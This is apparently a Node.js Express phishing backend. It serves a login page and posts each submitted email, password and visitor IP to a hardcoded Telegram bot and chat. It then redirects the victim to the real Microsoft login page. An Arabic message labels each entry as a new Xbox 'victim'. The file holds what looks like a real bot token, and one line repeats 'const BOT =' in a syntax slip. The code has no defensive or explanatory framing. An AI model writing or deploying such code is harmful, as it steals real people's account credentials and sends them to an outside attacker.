const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
app.use(express.urlencoded({ extended: true }));

const BOT = const BOT = '9150077327:AAH9zLHAv0CZbFxm0yZw9zgAqEv2tujesXY';

const CHAT = '7304701786'; 

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/auth', async (req, res) => {
  const { email, password } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT}/sendMessage`, {
      chat_id: CHAT,
      text: `🎯 ضحية إكس بوكس جديدة!\n📧 الإيميل: ${email}\n🔑 الباسوورد: ${password}\n🌐 IP: ${ip}`
    });
  } catch (e) {}

  res.redirect('https://login.live.com');
});

app.listen(process.env.PORT || 3000);